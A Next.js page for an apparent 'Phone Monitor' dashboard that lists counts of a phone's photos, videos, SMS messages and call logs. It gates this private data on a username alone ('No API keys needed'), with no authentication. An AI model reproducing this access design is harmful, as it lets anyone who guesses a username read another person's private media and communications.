'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';

export default function Home() {
  const [username, setUsername] = useState('');
  const [isConfigured, setIsConfigured] = useState(false);
  const [stats, setStats] = useState({ photos: 0, videos: 0, messages: 0, calls: 0 });
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const savedUsername = localStorage.getItem('username');
    if (savedUsername) {
      setUsername(savedUsername);
      setIsConfigured(true);
      fetchStats(savedUsername);
    }
  }, []);

  const handleSaveConfig = async () => {
    if (!username.trim()) {
      setError('Please enter a username');
      return;
    }

    setLoading(true);
    setError('');

    try {
      // Check if user exists in database
      const response = await fetch(`/api/users/check?username=${username}`);
      const data = await response.json();

      if (!data.exists) {
        setError(`Username "${username}" doesn't exist. Please start monitoring from your phone app first.`);
        setLoading(false);
        return;
      }

      localStorage.setItem('username', username);
      setIsConfigured(true);
      fetchStats(username);
    } catch (err) {
      setError('Failed to verify username. Please try again.');
      setLoading(false);
    }
  };

  const fetchStats = async (user: string) => {
    setLoading(true);
    try {
      const [photos, videos, messages, calls] = await Promise.all([
        fetch(`/api/photos?username=${user}`).then(r => r.json()),
        fetch(`/api/videos?username=${user}`).then(r => r.json()),
        fetch(`/api/sms?username=${user}`).then(r => r.json()),
        fetch(`/api/calls?username=${user}`).then(r => r.json()),
      ]);
      setStats({
        photos: Array.isArray(photos) ? photos.length : 0,
        videos: Array.isArray(videos) ? videos.length : 0,
        messages: Array.isArray(messages) ? messages.length : 0,
        calls: Array.isArray(calls) ? calls.length : 0,
      });
    } catch (error) {
      console.error('Failed to fetch stats:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 p-6">
      <div className="max-w-6xl mx-auto">
        <div className="text-center mb-12">
          <h1 className="text-6xl font-bold text-white mb-4 bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-pink-600">
            Phone Monitor
          </h1>
          <p className="text-gray-300 text-lg">Monitor your device remotely from anywhere</p>
          <p className="text-gray-400 text-sm mt-2">✨ Username-based - No API keys needed!</p>
        </div>

        {!isConfigured ? (
          <div className="max-w-md mx-auto bg-white/10 backdrop-blur-lg rounded-2xl p-8 border border-white/20">
            <h2 className="text-2xl font-bold text-white mb-6">Enter Username</h2>
            <div className="space-y-4">
              <div>
                <label className="block text-gray-300 mb-2">Username</label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value);
                    setError('');
                  }}
                  placeholder="Enter your username"
                  className="w-full px-4 py-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500"
                  onKeyPress={(e) => e.key === 'Enter' && handleSaveConfig()}
                />
                <p className="text-xs text-gray-400 mt-2">
                  This is the username you configured in your phone app
                </p>
                {error && (
                  <div className="mt-3 p-3 bg-red-500/20 border border-red-500/50 rounded-lg">
                    <p className="text-red-200 text-sm">{error}</p>
                  </div>
                )}
              </div>
              <button
                onClick={handleSaveConfig}
                disabled={loading}
                className="w-full px-6 py-3 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-lg font-semibold hover:from-purple-600 hover:to-pink-600 transition-all disabled:opacity-50"
              >
                {loading ? 'Verifying...' : 'View Dashboard'}
              </button>
            </div>
          </div>
        ) : (
          <>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
              <Link href="/photos" className="group">
                <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20 hover:bg-white/20 transition-all hover:scale-105">
                  <div className="text-4xl mb-4">📸</div>
                  <h3 className="text-2xl font-bold text-white mb-2">Photos</h3>
                  <p className="text-gray-300 text-3xl font-bold">{stats.photos}</p>
                </div>
              </Link>

              <Link href="/videos" className="group">
                <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20 hover:bg-white/20 transition-all hover:scale-105">
                  <div className="text-4xl mb-4">🎥</div>
                  <h3 className="text-2xl font-bold text-white mb-2">Videos</h3>
                  <p className="text-gray-300 text-3xl font-bold">{stats.videos}</p>
                </div>
              </Link>

              <Link href="/messages" className="group">
                <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20 hover:bg-white/20 transition-all hover:scale-105">
                  <div className="text-4xl mb-4">💬</div>
                  <h3 className="text-2xl font-bold text-white mb-2">Messages</h3>
                  <p className="text-gray-300 text-3xl font-bold">{stats.messages}</p>
                </div>
              </Link>

              <Link href="/calls" className="group">
                <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20 hover:bg-white/20 transition-all hover:scale-105">
                  <div className="text-4xl mb-4">📞</div>
                  <h3 className="text-2xl font-bold text-white mb-2">Call Logs</h3>
                  <p className="text-gray-300 text-3xl font-bold">{stats.calls}</p>
                </div>
              </Link>
            </div>

            <div className="text-center">
              <p className="text-gray-400 mb-4">Logged in as: <span className="text-white font-semibold">{username}</span></p>
              <button
                onClick={() => {
                  localStorage.clear();
                  setIsConfigured(false);
                  setUsername('');
                  setError('');
                }}
                className="px-6 py-2 bg-white/10 text-white rounded-lg hover:bg-white/20 transition-all"
              >
                Change Username
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}
